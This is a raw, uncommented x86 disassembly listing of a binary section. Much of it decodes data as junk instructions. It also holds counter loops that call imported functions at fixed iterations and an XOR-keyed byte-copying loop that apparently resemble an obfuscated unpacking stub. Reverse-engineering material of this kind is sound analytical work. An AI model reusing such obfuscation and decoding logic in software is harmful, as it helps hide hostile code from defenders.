  4028ec:	push   0x28
  4028ee:	scas   al,BYTE PTR es:[edi]
  4028ef:	push   ebx
  4028f0:	or     BYTE PTR [esi+0x7e],bh
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x402970
  4028f8:	pop    ecx
  4028f9:	enter  0x4b79,0xfb
  4028fd:	stmxcsr DWORD PTR [ecx+edx*4+0x2fc1fd09]
  402905:	and    edi,DWORD PTR [ebp+0x2e]
  402908:	push   0xc8204d93
  40290d:	dec    eax
  40290e:	adc    ebp,DWORD PTR [eax+0x57]
  402911:	int3   
  402912:	loop   0x4028e9
  402914:	inc    ebx
  402915:	push   ss
  402916:	mov    ch,0xee
  402918:	pop    edi
  402919:	cmp    esi,eax
  40291b:	call   0x65f5c021
  402920:	and    DWORD PTR [edi+0x5c7837a1],edx
  402926:	jb     0x4028d9
  402928:	mov    ebx,DWORD PTR [eax+0x4f]
  40292b:	lock push 0xa
  40292e:	jne    0x4028b4
  402930:	xor    DWORD PTR [edi+ebp*1-0x21d177ff],edx
  402937:	cdq    
  402938:	add    DWORD PTR [eax],esp
  40293a:	cwde   
  40293b:	cwde   
  40293c:	cmp    bl,dl
  40293e:	mov    eax,0xcbaec3cf
  402943:	fwait
  402944:	out    dx,eax
  402945:	lahf   
  402946:	enter  0xd46a,0x7e
  40294a:	dec    ebp
  40294b:	out    dx,al
  40294c:	jbe    0x402995
  40294e:	add    BYTE PTR [ebx],ah
  402950:	les    edi,FWORD PTR [edi+0x43da7e75]
  402956:	cmp    al,0x41
  402958:	jno    0x40297b
  40295a:	push   ds
  40295b:	cmp    dl,bl
  40295d:	dec    ebx
  40295e:	pushf  
  40295f:	dec    edx
  402960:	mov    ds:0xb26994d6,al
  402965:	lods   al,BYTE PTR ds:[esi]
  402966:	sbb    DWORD PTR [edi-0x4ff64d02],0x3c88b65
  402970:	cmp    DWORD PTR [eax],edx
  402972:	adc    BYTE PTR [ebx+0x77b9ba4f],al
  402978:	jbe    0x402996
  40297a:	cmp    al,BYTE PTR [ebx+0x407e0e82]
  402980:	scas   al,BYTE PTR es:[edi]
  402981:	sub    BYTE PTR [esp+edi*4-0x32],bl
  402985:	clc    
  402986:	je     0x402998
  402988:	adc    eax,0x3332469d
  40298d:	scas   eax,DWORD PTR es:[edi]
  40298e:	add    ebx,ebp
  402990:	gs pop es
  402992:	std    
  402993:	pushf  
  402994:	aam    0xd6
  402996:	cmp    ebp,DWORD PTR [esi+0x16f2d066]
  40299c:	inc    eax
  40299d:	loop   0x4029a3
  40299f:	cmp    BYTE PTR [ecx],dh
  4029a1:	rol    bl,1
  4029a3:	in     al,0x2f
  4029a5:	dec    ebx
  4029a6:	clc    
  4029a7:	jne    0x402a00
  4029a9:	push   ecx
  4029aa:	jno    0x40292f
  4029ac:	mov    edx,0x69c6bce
  4029b1:	xchg   DWORD PTR [edx-0x3d],ebp
  4029b4:	enter  0xd6a9,0x83
  4029b8:	sub    al,0x7
  4029ba:	cli    
  4029bb:	push   0xffffff8c
  4029bd:	mov    eax,0x4d8c009f
  4029c2:	or     eax,eax
  4029c4:	adc    DWORD PTR [edx],ecx
  4029c6:	jmp    0x577d:0x58c515d1
  4029cd:	jne    0x402a08
  4029cf:	mov    ecx,0xde509f97
  4029d4:	test   ebp,edi
  4029d6:	xor    esp,DWORD PTR [edi-0x97ed53b]
  4029dc:	test   DWORD PTR [eax+edx*4],edi
  4029df:	xor    eax,0xbedee416
  4029e4:	ins    BYTE PTR es:[edi],dx
  4029e5:	scas   eax,DWORD PTR es:[edi]
  4029e6:	cwde   
  4029e7:	add    eax,0x5716e09e
  4029ec:	pop    esp
  4029ed:	popf   
  4029ee:	rcr    al,0xdf
  4029f1:	ja     0x402a22
  4029f3:	ins    DWORD PTR es:[edi],dx
  4029f4:	pop    ds
  4029f5:	inc    ebx
  4029f6:	jmp    0x6fa4c471
  4029fb:	stos   BYTE PTR es:[edi],al
  4029fc:	pop    esi
  4029fd:	cwde   
  4029fe:	pop    edi
  4029ff:	in     al,0x67
  402a01:	sub    BYTE PTR [eax-0x32d040c6],cl
  402a07:	pop    ds
  402a08:	ja     0x402a25
  402a0a:	xchg   edi,eax
  402a0b:	fnsave [eax+0x6e]
  402a0e:	xor    al,0x13
  402a10:	xchg   esp,eax
  402a11:	or     bl,ah
  402a13:	dec    esi
  402a14:	mov    bh,0x73
  402a16:	pushf  
  402a17:	push   ecx
  402a18:	and    DWORD PTR ds:0x434707,0x0
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434707
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434707,edx
  402a34:	cmp    DWORD PTR ds:0x434707,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434707,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x434663
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434707,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434707
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434707,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x43467f,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x4346bb,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x4346f7,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x4346f7
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x4346f7,ecx
  402aac:	cmp    DWORD PTR ds:0x4346f7,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x4346f7,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43478f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x43477b
  402ae8:	or     DWORD PTR ds:0x434747,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x434737,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x434743,0x434683
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	push   edx
  402b20:	pop    edx
  402b21:	je     0x402b76
  402b23:	jae    0x402b2e
  402b25:	jle    0x402ba5
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402b55
  402b2c:	arpl   WORD PTR ds:0x77d96f6c,si
  402b32:	cmp    bl,BYTE PTR [eax+ecx*2-0x14]
  402b36:	jno    0x402abd
  402b38:	aaa    
  402b39:	sti    
  402b3a:	in     al,dx
  402b3b:	aas    
  402b3c:	push   0x2b
  402b3e:	lahf   
  402b3f:	gs push eax
  402b41:	inc    esp
  402b42:	push   ds
  402b43:	xor    BYTE PTR [eax+0x38f5632a],dl
  402b49:	add    BYTE PTR [edx],bl
  402b4b:	dec    ebx
  402b4c:	pop    edx
  402b4d:	inc    edx
  402b4e:	sbb    esi,DWORD PTR [ebx]
  402b50:	pop    ebp
  402b51:	addr16 jmp 0x3585bbbb
  402b57:	xchg   BYTE PTR [ebx+esi*4],ah
  402b5a:	fisttp WORD PTR [ebp-0x19]
  402b5d:	fwait
  402b5e:	std    
  402b5f:	mov    eax,ds:0x978bcc06
  402b64:	pop    es
  402b65:	pop    ebx
  402b66:	push   esp
  402b67:	inc    edi
  402b68:	xchg   esp,eax
  402b69:	enter  0x3dfe,0x3b
  402b6d:	push   ecx
  402b6e:	push   ss
  402b6f:	jns    0x402b8b
  402b71:	push   0x1e48f435
  402b76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b77:	xchg   edx,eax
  402b78:	aad    0xdb
  402b7a:	gs out 0xa2,al
  402b7d:	push   edx
  402b7e:	push   edi
  402b7f:	pop    esi
  402b80:	pop    ebp
  402b81:	push   edi
  402b82:	es sti 
  402b84:	test   al,0xf2
  402b86:	bound  edi,QWORD PTR [ebp-0x7f]
  402b89:	sub    eax,DWORD PTR ds:0xda8b3467
  402b8f:	mov    ds:0x549d810b,al
  402b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b95:	adc    dh,cl
  402b97:	add    BYTE PTR [edx],ch
  402b99:	mov    al,0xaf
  402b9c:	mov    eax,0xa03cb95e
  402ba1:	adc    al,0x2f
  402ba3:	das    
  402ba4:	lods   eax,DWORD PTR ds:[esi]
  402ba5:	xor    BYTE PTR [esi],0xde
  402ba8:	and    ecx,ebp
  402baa:	pop    es
  402bab:	or     BYTE PTR [ebp+0x1b],ch
  402bae:	sub    esi,DWORD PTR [ebx+0x5c9b135b]
  402bb4:	loop   0x402b78
  402bb6:	(bad)  
  402bb7:	or     al,ch
  402bb9:	ds xor al,0x7f
  402bbc:	rcl    BYTE PTR [edi],1
  402bbe:	xor    bh,BYTE PTR [esi-0x69]
  402bc1:	in     al,0xbc
  402bc3:	(bad)  
  402bc5:	loope  0x402b5c
  402bc7:	xchg   ebx,eax
  402bc8:	xchg   ecx,eax
  402bc9:	push   es
  402bca:	xor    BYTE PTR [esi],cl
  402bcc:	sti    
  402bcd:	icebp  
  402bce:	leave  
  402bcf:	xor    eax,0xccddc41a
  402bd4:	push   cs
  402bd5:	mov    ds:0xe0031dde,al
  402bda:	push   ss
  402bdb:	push   es
  402bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bdd:	pop    ebx
  402bde:	aas    
  402bdf:	ja     0x402bce
  402be1:	xchg   ebp,eax
  402be2:	popa   
  402be3:	call   0xf2cde77a
  402be8:	inc    esp
  402be9:	ret    0xa54b
  402bec:	ins    BYTE PTR es:[edi],dx
  402bed:	loope  0x402bf0
  402bef:	in     eax,0xa8
  402bf1:	fcomp  QWORD PTR [ebx]
  402bf3:	mov    cl,0x3c
  402bf5:	mov    al,ds:0x1533ef87
  402bfa:	add    ch,cl
  402bfc:	in     al,0x1
  402bfe:	pop    ebp
  402bff:	(bad)  
  402c01:	add    al,0x85
  402c03:	loop   0x402c10
  402c05:	xchg   edi,edi
  402c07:	jmp    0x7b046fc
  402c0c:	add    al,0x68
  402c0e:	lock inc edi
  402c10:	jmp    0x7dffef86
  402c15:	(bad)  
  402c16:	and    ecx,edx
  402c18:	push   eax
  402c19:	ficomp WORD PTR [ecx+0x6615dd92]
  402c1f:	and    al,0xa6
  402c21:	mov    cl,0x85
  402c23:	pop    ss
  402c24:	mov    dh,0x19
  402c26:	test   al,0xfb
  402c28:	mov    ds:0x61be8c30,eax
  402c2d:	hlt    
  402c2e:	pop    ebx
  402c2f:	dec    ebx
  402c30:	xor    al,0x62
  402c32:	scas   eax,DWORD PTR es:[edi]
  402c33:	jb     0x402bd7
  402c35:	iret   
  402c36:	push   edx
  402c37:	push   ebx
  402c38:	cdq    
  402c39:	ret    0xf945
  402c3c:	mov    eax,ds:0xe51069ac
  402c41:	(bad)  
  402c42:	arpl   WORD PTR [ebx],cx
  402c44:	scas   al,BYTE PTR es:[edi]
  402c45:	xor    ebp,DWORD PTR [eax-0x27]
  402c48:	sbb    eax,0xd603fcf7
  402c4d:	cmp    edi,edx
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434687,0x0
  402c5f:	mov    eax,ds:0x434687
  402c64:	inc    eax
  402c65:	mov    ds:0x434687,eax
  402c6a:	cmp    DWORD PTR ds:0x434687,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434687,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x434667,0x434793
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	cdq    
  402ce7:	add    dl,BYTE PTR [ebp+eax*1+0x7e7e0b13]
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402c7b
  402cf3:	shr    DWORD PTR [edx-0x45],1
  402cf6:	xchg   edx,eax
  402cf7:	and    DWORD PTR [esp+ecx*1+0x6e],edi
  402cfb:	cld    
  402cfc:	das    
  402cfd:	mov    edx,0x7d1c6467
  402d02:	jecxz  0x402cd1
  402d04:	cwde   
  402d05:	sub    DWORD PTR [esi+eiz*1],0x2c
  402d09:	adc    BYTE PTR [eax+0x51],ch
  402d0c:	jbe    0x402d74
  402d0e:	jmp    DWORD PTR [eax]
  402d10:	mov    al,ds:0xf75c41d9
  402d15:	push   ds
  402d16:	fldenv [ecx+eax*2-0x27c52767]
  402d1d:	jle    0x402d15
  402d1f:	pusha  
  402d20:	mov    ds:0x3c58bd9c,eax
  402d25:	gs add esi,ebp
  402d28:	dec    eax
  402d29:	and    eax,0xddc08154
  402d2e:	mov    al,0x37
  402d30:	jno    0x402cbc
  402d32:	mov    esp,0x5fb55d39
  402d37:	je     0x402d9e
  402d39:	add    cl,ch
  402d3b:	test   BYTE PTR [edi],0x98
  402d3e:	inc    esp
  402d3f:	mov    al,ds:0xfe991340
  402d44:	push   esp
  402d45:	cmp    ebp,ecx
  402d47:	sub    BYTE PTR [esi-0x17abf609],bh
  402d4d:	mov    ds:0x5dd5be7e,al
  402d52:	pop    es
  402d53:	xchg   esi,eax
  402d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d55:	in     eax,0x45
  402d57:	sbb    ah,BYTE PTR [edx]
  402d59:	mov    al,0xe5
  402d5b:	add    DWORD PTR [esi],esp
  402d5d:	cdq    
  402d5e:	retf   0x1001
  402d61:	cld    
  402d62:	pop    ss
  402d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d64:	pop    ds
  402d65:	push   ss
  402d66:	pusha  
  402d67:	cs loope 0x402d27
  402d6a:	pop    esp
  402d6b:	pop    ecx
  402d6c:	fwait
  402d6d:	and    ebx,DWORD PTR [edx]
  402d6f:	or     DWORD PTR [ecx],esp
  402d71:	adc    eax,DWORD PTR [ebp-0x28]
  402d74:	ins    DWORD PTR es:[edi],dx
  402d75:	test   al,0xc3
  402d77:	fstp   DWORD PTR [edi]
  402d79:	fdivr  QWORD PTR [ecx]
  402d7b:	xchg   esp,eax
  402d7c:	pop    ecx
  402d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d7f:	and    eax,0xba2a62be
  402d84:	add    esi,DWORD PTR [ecx-0x55]
  402d87:	popa   
  402d88:	jo     0x402d11
  402d8a:	idiv   bh
  402d8c:	pop    eax
  402d8d:	retf   
  402d8e:	jp     0x402df2
  402d90:	(bad)  
  402d91:	(bad)  
  402d93:	mov    dl,0xe
  402d95:	dec    ebp
  402d96:	xlat   BYTE PTR ds:[ebx]
  402d97:	mov    ebx,ebx
  402d99:	dec    edi
  402d9a:	mov    BYTE PTR [ebp+0x4667e88f],cl
  402da0:	push   cs
  402da1:	jnp    0x402da4
  402da3:	retf   
  402da4:	mov    fs,WORD PTR [eax-0x2343850a]
  402daa:	scas   al,BYTE PTR es:[edi]
  402dab:	mov    eax,0xf546ad5b
  402db0:	ds sub eax,0xd6851109
  402db6:	sub    BYTE PTR [esi+ecx*1],bh
  402db9:	jecxz  0x402db0
  402dbb:	xchg   ebp,eax
  402dbc:	(bad)  
  402dbd:	xchg   ecx,eax
  402dbe:	and    BYTE PTR [eax+edx*1+0x18],0x2d
  402dc3:	mov    BYTE PTR [ecx-0x14f4f79b],bh
  402dc9:	imul   edi,eax,0xffffffcb
  402dcc:	cmp    edx,DWORD PTR [edx-0x2a]
  402dcf:	scas   eax,DWORD PTR es:[edi]
  402dd0:	mov    bl,0xb0
  402dd2:	shl    DWORD PTR [eax+0x55872841],cl
  402dd8:	cmp    eax,0x8c8c5c8
  402ddd:	lea    ebx,[eax+0x3c4ea65f]
  402de3:	push   cs
  402de4:	imul   esi
  402de6:	test   BYTE PTR [esi-0x61],bl
  402de9:	dec    edx
  402dea:	and    eax,0x356ba8c9
  402def:	push   eax
  402df0:	ds xchg ebp,eax
  402df2:	(bad)  
  402df3:	mov    ah,0x73
  402df5:	in     al,dx
  402df6:	and    esp,ecx
  402df8:	int3   
  402df9:	stos   DWORD PTR es:[edi],eax
  402dfa:	pop    edi
  402dfb:	fsub   st,st(6)
  402dfd:	push   ss
  402dfe:	retf   0x94ca
  402e01:	mov    esp,0x12a3f00c
  402e06:	sub    al,0x44
  402e08:	xchg   DWORD PTR [esi+eiz*1+0x47],esp
  402e0c:	or     al,0x9d
  402e0e:	add    dh,dh
  402e10:	fsubr  st,st(4)
  402e12:	mov    ebx,DWORD PTR [ebp+0xc]
  402e15:	xor    eax,ecx
  402e17:	add    eax,edx
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x4346f7,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    bh,BYTE PTR [esi+0x3327d50f]
  402e97:	adc    al,0x7e
  402e99:	jle    0x402ef1
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402e85
  402e9f:	out    0xd3,al
  402ea1:	or     al,0x1f
  402ea3:	sub    ch,bl
  402ea5:	push   ss
  402ea6:	in     eax,dx
  402ea7:	dec    edi
  402ea8:	sar    DWORD PTR [esi+eax*4+0x6a8d404e],cl
  402eaf:	scas   eax,DWORD PTR es:[edi]
  402eb0:	clc    
  402eb1:	pop    ecx
  402eb2:	inc    ecx
  402eb3:	or     BYTE PTR [eax],ah
  402eb5:	jbe    0x402ec0
  402eb7:	ret    0x99c2
  402eba:	cdq    
  402ebb:	mov    esp,0xfc1d12d9
  402ec0:	xor    ebx,esp
  402ec2:	pop    esi
  402ec3:	enter  0xe84,0x3a
  402ec7:	push   0xffffff86
  402ec9:	adc    al,0xac
  402ecb:	mov    edi,0x14ff30c7
  402ed0:	xor    DWORD PTR ss:[eax-0x6],ebx
  402ed4:	push   esp
  402ed5:	adc    bl,ah
  402ed7:	(bad)  
  402ed8:	pop    esp
  402ed9:	add    ecx,DWORD PTR [esi-0x36f1fe96]
  402edf:	mov    ecx,0x868ccd02
  402ee4:	inc    ecx
  402ee5:	ss xor edx,edi
  402ee8:	repnz xchg ebx,eax
  402eea:	fild   WORD PTR [ebx]
  402eec:	and    ch,BYTE PTR [ecx+0x34791ce7]
  402ef2:	test   al,0xa3
  402ef4:	vunpcklps ymm4,ymm5,YMMWORD PTR [esi]
  402ef8:	and    dh,BYTE PTR [ebp+0x7dea91f3]
  402efe:	mov    eax,ds:0xef1ec54c
  402f03:	xlat   BYTE PTR ds:[ebx]
  402f04:	or     eax,0x1389551b
  402f09:	sub    dl,BYTE PTR [edx-0xf]
  402f0c:	aas    
  402f0d:	test   al,0xa5
  402f0f:	jno    0x402ebe
  402f11:	mov    bh,0x51
  402f13:	imul   ebp,ebx,0xca1a63ca
  402f19:	jle    0x402f60
  402f1b:	call   0x2d8542b8
  402f20:	sub    DWORD PTR [ebx-0x5a458644],ebx
  402f26:	mov    ds:0x38b600bc,eax
  402f2b:	sub    al,al
  402f2d:	addr16 (bad) 
  402f2f:	push   edx
  402f30:	mov    esp,0xb0e5a180
  402f35:	ret    0xd336
  402f38:	mov    cl,BYTE PTR [ebp-0x4d]
  402f3b:	sbb    eax,0x39d14295
  402f40:	daa    
  402f41:	push   edi
  402f42:	add    BYTE PTR [edx-0x77],al
  402f45:	fmul   DWORD PTR [ebx+0x53]
  402f48:	add    ebx,esi
  402f4a:	and    eax,DWORD PTR cs:[ebp+0x4e0d15c6]
  402f51:	jge    0x402fc6
  402f53:	push   edx
  402f54:	mov    ds:0x62e8a024,al
  402f59:	pusha  
  402f5a:	xchg   ecx,eax
  402f5b:	adc    BYTE PTR [eax-0x6d725b54],dh
  402f61:	fnstcw WORD PTR [ecx]
  402f63:	idiv   DWORD PTR [edx+0x5e]
  402f66:	jo     0x402f6b
  402f68:	adc    eax,0x4689a634
  402f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f6e:	test   eax,0xaa072366
  402f73:	loopne 0x402f9d
  402f75:	add    ah,BYTE PTR [ebx+ecx*8]
  402f78:	mov    edx,0x3bd11e9e
  402f7d:	and    al,0x8b
  402f7f:	jle    0x402f55
  402f81:	jge    0x402fa5
  402f83:	mov    ds:0x8fcaf2b8,eax
  402f88:	jg     0x402f73
  402f8a:	xchg   esi,eax
  402f8b:	jecxz  0x40300b
  402f8d:	loope  0x402fb6
  402f8f:	inc    esi
  402f90:	inc    edi
  402f91:	mov    ebx,0x3efbcd07
  402f96:	js     0x403005
  402f98:	fdiv   QWORD PTR [edx-0x324a449]
  402f9e:	in     al,0x1e
  402fa0:	stos   DWORD PTR es:[edi],eax
  402fa1:	fsub   QWORD PTR [edi]
  402fa3:	mov    ds:0x30c4e6fd,eax
  402fa8:	adc    BYTE PTR [edx+0x37],al
  402fab:	icebp  
  402fac:	dec    ebx
  402fad:	popf   
  402fae:	mov    bh,0x69
  402fb0:	dec    edi
  402fb1:	scas   al,BYTE PTR es:[edi]
  402fb2:	scas   eax,DWORD PTR es:[edi]
  402fb3:	in     eax,0x16
  402fb5:	xchg   ecx,eax
  402fb6:	adc    eax,0xdb6f9b1d
  402fbb:	push   eax
  402fbc:	push   esp
  402fbd:	jo     0x402fc8
  402fbf:	dec    ebx
  402fc0:	add    eax,0x570d9844
  402fc5:	fstp   DWORD PTR [ecx+0x1089de83]
  402fcb:	imul   esi,DWORD PTR [edi+0x75d07fc0],0x67
  402fd2:	aad    0xb4
  402fd4:	arpl   WORD PTR [ecx],si
  402fd6:	out    0x23,eax
  402fd8:	push   ecx
  402fd9:	push   ds
  402fda:	push   ss
  402fdb:	ja     0x71c6d95d
  402fe1:	pop    edi
  402fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fe3:	add    al,0xde
  402fe5:	lods   al,BYTE PTR ds:[esi]
  402fe6:	in     eax,0x6a
  402fe8:	add    dl,BYTE PTR [ecx]
  402fea:	(bad)  
  402feb:	jbe    0x402fc0
  402fed:	mov    eax,ds:0x6f358923
  402ff2:	mov    al,0x80
  402ff4:	push   edi
  402ff5:	dec    ebp
  402ff6:	sti    
  402ff7:	push   0xffffff8d
  402ff9:	cmp    eax,0x7537a5e2
  402ffe:	mov    edi,0x1995d3b3
  403003:	aam    0x2d
  403005:	es push eax
  403007:	pusha  
  403008:	xor    al,0x8e
  40300a:	nop
  40300b:	pusha  
  40300c:	jecxz  0x403064
  40300e:	sahf   
  40300f:	xchg   ebx,eax
  403010:	clc    
  403011:	cmp    al,0x72
  403013:	pushf  
  403014:	mov    edx,0x42879e29
  403019:	xor    DWORD PTR [ebx-0x2c],edi
  40301c:	dec    edx
  40301d:	push   eax
  40301e:	stos   BYTE PTR es:[edi],al
  40301f:	inc    edi
  403020:	loop   0x40300a
  403022:	hlt    
  403023:	in     al,dx
  403024:	and    edx,esi
  403026:	xor    DWORD PTR [ebx],esi
  403028:	test   al,0x9a
  40302a:	add    eax,0xd74f99fb
  40302f:	sbb    BYTE PTR [edi-0x70],0x4a
  403033:	add    esi,edx
  403035:	push   edi
  403036:	mov    ebx,0xe18b945f
  40303b:	dec    ecx
  40303c:	jae    0x403026
  40303e:	inc    ebp
  40303f:	or     esp,DWORD PTR es:[edi+esi*1+0x33ea0755]
  403047:	fwait
  403048:	lea    ebx,[ebx*1+0x4def4bab]
  40304f:	lahf   
  403050:	xchg   ecx,eax
  403051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403053:	test   al,0xd1
  403055:	xor    bh,BYTE PTR ds:0x1e87ca40
  40305b:	inc    esp
  40305c:	lds    eax,FWORD PTR [ebx+eax*2+0x5b]
  403060:	push   ebp
  403061:	cmp    ch,BYTE PTR [ecx]
  403063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403064:	aad    0x45
  403066:	jno    0x40301b
  403068:	cli    
  403069:	fdiv   QWORD PTR [esi+0x4e]
  40306c:	or     eax,DWORD PTR [ecx+0x19bc1c81]
  403072:	fsubr  QWORD PTR [eax-0x777019fa]
  403078:	sbb    DWORD PTR [ecx],eax
  40307a:	pop    esp
  40307b:	cdq    
  40307c:	cmp    ecx,ebp
  40307e:	and    esp,DWORD PTR [esi+eax*2+0x751a699]
  403085:	sbb    DWORD PTR [eax+edi*8-0x3bc97a93],edx
  40308c:	push   cs
  40308d:	jae    0x4030e5
  40308f:	xchg   esi,eax
  403090:	jmp    0x8d753f08
  403095:	push   ebp
  403096:	nop
  403097:	mov    eax,ds:0x2a0169b2
  40309c:	adc    cl,cl
  40309e:	sub    edx,DWORD PTR [ecx+0x55c6a5e4]
  4030a4:	jb     0x403085
  4030a6:	ret    0xa40a
  4030a9:	push   edi
  4030aa:	dec    ebp
  4030ab:	test   al,0x4e
  4030ad:	push   edx
  4030ae:	mov    esp,ebx
  4030b0:	pop    es
  4030b1:	mov    ebp,0x265dea0c
  4030b6:	dec    eax
  4030b7:	retf   
  4030b8:	enter  0x1399,0xf
  4030bc:	push   esi
  4030bd:	sbb    al,0xe0
  4030bf:	pusha  
  4030c0:	mov    ecx,DWORD PTR [ebp-0x6629ce6]
  4030c6:	lds    ebx,FWORD PTR [ecx-0x2]
  4030c9:	mov    dl,0x9c
  4030cb:	stos   DWORD PTR es:[edi],eax
  4030cc:	lods   al,BYTE PTR ds:[esi]
  4030cd:	fsubr  DWORD PTR [ebx]
  4030cf:	add    eax,0x79054fc
  4030d4:	jmp    0xf291:0x9d0e8a74
  4030db:	outs   dx,DWORD PTR ds:[esi]
  4030dc:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030de:	jae    0x403094
  4030e0:	imul   esi,DWORD PTR [eax+0x64],0x222e8f2e
  4030e7:	cwde   
  4030e8:	js     0x403150
  4030ea:	repnz push esi
  4030ec:	scas   eax,DWORD PTR es:[edi]
  4030ed:	inc    esi
  4030ee:	rcl    BYTE PTR [edx+0x1a],cl
  4030f1:	(bad)  
  4030f2:	xchg   edi,eax
  4030f3:	xchg   edi,eax
  4030f4:	mov    bh,0x62
  4030f6:	test   BYTE PTR [esi+eiz*1+0x4704fe82],cl
  4030fd:	push   ds
  4030fe:	std    
  4030ff:	mov    dl,BYTE PTR ds:0x51d46ee0
  403105:	les    edi,FWORD PTR [eax]
  403107:	inc    ebx
  403108:	shl    bl,1
  40310a:	leave  
  40310b:	mov    bh,0xef
  40310d:	cli    
  40310e:	es and eax,0x317b3988
  403114:	push   0x3b
  403116:	in     al,0xb4
  403118:	cmp    al,0x6a
  40311a:	mov    ecx,0x898d78b5
  40311f:	inc    ebp
  403120:	pushf  
  403121:	outs   dx,DWORD PTR ds:[esi]
  403122:	or     bl,ch
  403124:	add    BYTE PTR [esi],dh
  403126:	popa   
  403127:	jg     0x40318e
  403129:	mov    ds:0x619e65a4,eax
